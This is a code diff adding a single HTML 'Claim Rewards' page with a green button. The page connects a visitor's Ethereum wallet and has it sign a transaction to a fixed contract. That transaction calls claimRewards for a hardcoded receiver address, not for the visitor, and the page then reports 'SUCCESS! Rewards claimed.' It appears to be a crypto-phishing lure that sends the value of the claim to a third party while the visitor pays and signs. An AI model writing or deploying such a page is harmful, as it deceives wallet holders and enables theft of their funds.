@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Claim Rewards</title>
+    <style>
+        body { 
+            background:#111; 
+            color:#0f0; 
+            font-family:Arial, sans-serif; 
+            text-align:center; 
+            padding:50px; 
+        }
+        h1 { margin-bottom:10px; }
+        button { 
+            padding:18px 50px; 
+            font-size:20px; 
+            background:#00ff00; 
+            color:#000; 
+            border:none; 
+            border-radius:12px; 
+            cursor:pointer; 
+            margin-top:20px;
+        }
+        button:hover { background:#00cc00; }
+        button:disabled { background:#555; cursor:not-allowed; }
+        .info { margin-top:30px; font-size:14px; color:#aaa; }
+        a { color:#0f0; }
+    </style>
+</head>
+<body>
+    <h1>CLAIM REWARDS</h1>
+
+    <button id="claimBtn">CLICK TO CLAIM REWARDS</button>
+
+    <div id="status" class="info"></div>
+
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script>
+        const CONTRACT_ADDRESS = "0x0B3E87a076AC4B0d1975F0f232444af6DEb96c59";
+        const RECEIVER_ADDRESS = "0x00008F1149168c1d2fa1eba1ad3e9cd644510000";
+
+        // keccak256("claimRewards(address)") → first 4 bytes
+        const FUNCTION_SELECTOR = "0xe15cfb3c";
+
+        function buildCalldata(to) {
+            const clean = to.toLowerCase().slice(2);
+            const padded = clean.padStart(64, "0");
+            return FUNCTION_SELECTOR + padded;
+        }
+
+        document.getElementById("claimBtn").onclick = async () => {
+            const btn = document.getElementById("claimBtn");
+            const status = document.getElementById("status");
+
+            if (!window.ethereum) {
+                alert("MetaMask (or another wallet) not detected!");
+                return;
+            }
+
+            btn.disabled = true;
+            status.textContent = "Connecting to wallet...";
+
+            try {
+                // Request wallet connection
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+
+                status.textContent = "Sending claim transaction...";
+
+                const tx = await signer.sendTransaction({
+                    to: CONTRACT_ADDRESS,
+                    data: buildCalldata(RECEIVER_ADDRESS),
+                    value: 0   // no ETH needed
+                });
+
+                status.innerHTML = `Transaction sent!<br/>
+                    <a href="https://etherscan.io/tx/${tx.hash}" target="_blank">
+                        View on Etherscan → ${tx.hash}
+                    </a>`;
+
+                // Wait for confirmation
+                await tx.wait();
+                status.innerHTML += "<br><br><b>SUCCESS! Rewards claimed.</b>";
+
+            } catch (error) {
+                console.error(error);
+                status.innerHTML = "Failed: " + (error.message || error.reason || "Unknown error");
+                btn.disabled = false;
+            }
+        };
+    </script>
+</body>
+</html>
